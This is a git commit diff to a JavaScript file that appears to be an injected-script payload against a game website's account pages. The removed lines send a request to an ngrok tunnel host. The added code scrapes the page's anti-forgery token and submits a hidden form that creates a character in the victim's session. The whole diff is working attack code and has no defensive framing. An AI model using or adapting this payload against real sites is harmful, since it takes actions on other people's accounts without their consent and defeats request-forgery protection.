c9d8608ae6151eca0018c7a220ff2ed02f3a2a6d
Andrey Mattos <andreysmattos@hotmail.com>
2020-04-16 10:32:54 -0300

    teste

--- index.js
+++ index.js
@@ -1,15 +1,38 @@
-xhttp = new XMLHttpRequest();
+async function getToken() {
+  const request = await fetch("/account/character");
+  let htmlObject = document.createElement("div");
+  htmlObject.innerHTML = await request.text();
+  let token = htmlObject.querySelector("input[name='_token']").value;
+  return token;
+}
 
-xhttp.open('GET', 'https://b18019bb.ngrok.io');
-xhttp.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
-xhttp.send(JSON.stringify({ "html": "dasda" }));
-xhttp.send()
+async function createCharacter() {
+  const alfabeto = "abcdefghijlmnopqrstuv".split('');
+  const random = Math.floor(Math.random() * (alfabeto.length))
+  const letra = alfabeto[random];
+  const form = document.createElement("form");
+  form.style = "display: none";
+  form.method = "POST";
+  form.action = "/account/character";
 
+  const inputName = document.createElement("input");
+  inputName.name = "name";
+  inputName.value = "Andrey Beijo" + letra;
+  const inputToken = document.createElement("input");
+  const token = await getToken();
+  inputToken.name = "_token";
+  inputToken.value = token;
 
+  const inputGender = document.createElement("input");
+  inputGender.name = "gender";
+  inputGender.value = 0;
 
-xhttp.onreadystatechange = function() {
-    if (this.readyState == 4 && this.status == 200) {
-        console.log(this.responseText);
-    }
-};
-console.log(xhttp)
+  form.append(inputName);
+  form.append(inputToken);
+  form.append(inputGender);
+
+  document.body.append(form);
+  form.submit();
+}
+
+createCharacter();
